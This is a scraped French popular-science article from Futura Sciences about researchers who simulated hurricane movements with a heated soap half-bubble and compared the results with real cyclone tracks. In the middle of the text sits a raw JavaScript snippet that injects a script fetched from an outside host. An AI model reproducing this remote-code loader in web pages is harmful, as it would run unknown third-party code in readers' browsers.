{"title": "Les ouragans simulés... dans une bulle de savon", "newspaper": "Futura Sciences", "author": "Jean Etienne, Futura", "date_publi": "12/04/2008", "content": "L'ouragan Ophélia traverse actuellement l'océan Atlantique et, en ce week-end d'octobre 2017, il génère des vents puissants sur le nord de l'Europe en même temps qu'une douceur presqu'estivale plus au sud. Les scientifiques peinent toujours à comprendre les détails de ces gigantesques structures atmosphériques. Ils s'aident de modèles numériques, bâties sur les observations, mais aussi sur des modèles physiques. En 2008, nous relations cette belle expérience de chercheurs français qui simulaient des ouragans avec des bulles de savon. Élégant et efficace. Article paru le 12 avril 2008 À une échelle pourtant bien différente, une bulle de savon peut être comparée à l' atmosphère  qui entoure notre planète, à tel point qu'elle peut en constituer un modèle. Comme elle, elle est constituée d'une couche très mince en comparaison de son diamètre et sa fluidité permet à la  matière  qui la compose de circuler librement. Cette similitude a inspiré une équipe de chercheurs du Centre de  physique  moléculaire optique et hertzienne (CPMOH) de l'université Bordeaux et de l'université de La Réunion. Les scientifiques ont utilisé une bulle de savon pour simuler la composante aléatoire régissant le  mouvement  des  ouragans , pour mieux comprendre ces phénomènes dévastateurs. Mais la distribution des températures au sein de l'atmosphère terrestre n'est pas uniforme. Pour résoudre ce problème, les chercheurs ont créé une demi-bulle formée par une surface d'eau et de savon obturant un récipient chauffé. À son contact, c'est-à-dire à l'équateur de la demi-bulle, la température est de 45 °C alors qu'elle est plus basse au niveau de l'unique pôle. Dans cette expérience, de nombreux courants de  convection  sont apparus à la base, puis un gros  tourbillon  s'est aussitôt formé, ressemblant fort à un ouragan. Un ouragan miniature. Il a tout d'un vrai. © Fanny Seychelles, Hamid Kellay                               Une Terre en miniature Les chercheurs ont filmé les mouvements de la bulle puis ont traité les images sur  ordinateur  pour pointer les structures en mouvement. Ils ont pu ainsi analyser finement les fluctuations apparemment désordonnées de ce tourbillon, qui se caractérisent par une loi dite superdiffusive correspondant à un mouvement de type  vol de Levy , c'est-à-dire une trajectoire aléatoire dominée par des  sursauts  peu nombreux mais de grande amplitude.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  L'équipe a ensuite étudié les trajectoires de  cyclones  de la saison 2003-2004, et mesuré la composante aléatoire, toujours présente dans leurs déplacements. Avec surprise, une très grande similarité est apparue entre les ouragans atmosphériques et les tourbillons des bulles de savon. Leurs résultats viennent d'être publiés dans la revue  Physical Review Letters . Hamid Kellay, du CPMOH, tempère cette  analogie  en signalant que les mouvements des ouragans véritables sont fortement affectés par la rotation de la  Terre  ainsi que par d'autres phénomènes atmosphériques complexes. Mais la prise en compte de la part aléatoire, jusqu'ici méconnue, du comportement des ouragans met en évidence l'universalité des statistiques des fluctuations de trajectoire. À terme, elle devrait aider à mieux prévoir leurs trajectoires et anticiper les risques. L'ouragan Maria observé en infrarouge                       L'ouragan Maria vu par le satellite GOES-16, de la NOAA le 20 septembre 2017, quand il passait au-dessus de l'île de Porto Rico. L'image est prise en infrarouge. Les couleurs sont donc fausses mais informatives. Elles indiquent la densité des nuages et la force de la tempête. Autour de l'œil du cyclone, la couleur rouge montre les plus fortes puissances.                                       ", "theme": "planete"}